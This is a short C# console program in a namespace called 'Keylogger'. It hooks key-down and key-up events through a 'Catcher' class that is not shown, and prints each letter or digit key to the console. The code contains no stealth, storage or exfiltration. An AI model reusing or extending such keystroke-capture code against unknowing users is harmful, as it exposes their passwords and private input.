using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Keylogger
{
    class Program
    {
        static ManualResetEvent waitHandle = new ManualResetEvent(false);
        static void Main(string[] args)
        {
            Catcher catcher;
            Task CatherTask = Task.Factory.StartNew(() =>
            {
                catcher = new Catcher(20);
                catcher.KeyDown += KeyDown;
                catcher.KeyUp += KeyUp;
                catcher.Start();
            });
            waitHandle.WaitOne();
        }

        static void KeyDown(Keys key)
        {
            KeysConverter kc = new KeysConverter();
            string keyChar = kc.ConvertToString(key);
            if(char.IsLetterOrDigit(keyChar[0]))
                Console.WriteLine(keyChar + " - Down");
        }

        static void KeyUp(Keys key)
        {
            KeysConverter kc = new KeysConverter();
            string keyChar = kc.ConvertToString(key);
            if (char.IsLetterOrDigit(keyChar[0]))
                Console.WriteLine(keyChar + " - Up");
        }
    }
}
